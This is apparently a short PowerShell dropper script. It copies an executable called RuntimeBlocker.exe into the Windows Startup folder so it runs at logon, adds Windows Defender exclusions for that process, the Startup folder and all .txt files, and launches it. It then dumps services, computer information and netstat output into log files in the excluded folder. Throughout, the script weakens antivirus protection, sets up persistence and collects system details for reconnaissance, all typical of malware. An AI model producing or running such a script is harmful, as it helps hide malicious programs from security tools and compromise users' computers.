$t = Get-Location
$t1 = "RuntimeBlocker.exe"
$P=$t.tostring()+"\" + $t1
$autostart ="C:\Users\"+$env:UserName+"\"+"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

Copy-Item -Path $P -Destination $autostart
$l1 =$autostart + "\" + "log1.txt"
$l2 =$autostart + "\" + "log2.txt"
$l3 =$autostart + "\" + "log3.txt"


Add-MpPreference -ExclusionProcess $t1
Add-MpPreference -ExclusionPath $autostart
Add-MpPreference -ExclusionExtension “txt”
 
cd $autostart
.\RuntimeBlocker

get-service | out-file $l1
Get-ComputerInfo | out-file $l2
netstat -an | out-file $l3
